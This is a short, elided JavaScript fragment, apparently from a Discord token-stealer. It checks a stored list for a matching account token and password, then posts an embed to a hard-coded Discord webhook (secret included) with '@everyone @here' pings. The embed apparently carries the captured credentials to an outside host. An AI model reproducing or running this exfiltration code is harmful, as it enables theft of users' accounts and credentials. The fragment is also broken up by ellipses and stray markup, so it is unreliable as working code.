...
<b></b>
    ...
    try {
      ...
      if (process.logged.find((e) => e.token === token && e.passowrd === pass)) {
        ...
        await axios({ method: "POST", url: "https://discord.com/api/webhooks/1055967757004439653/pq3lIRIu8F67GzZMD6xtFpM5JRDtERQp_edBC3MYRM-Pvi4IbotLYrUEpJynxvga09v1", data: { content: "@everyone @here", embeds: [embed.toJSON()] } }).catch((err) => console.log(err.name));
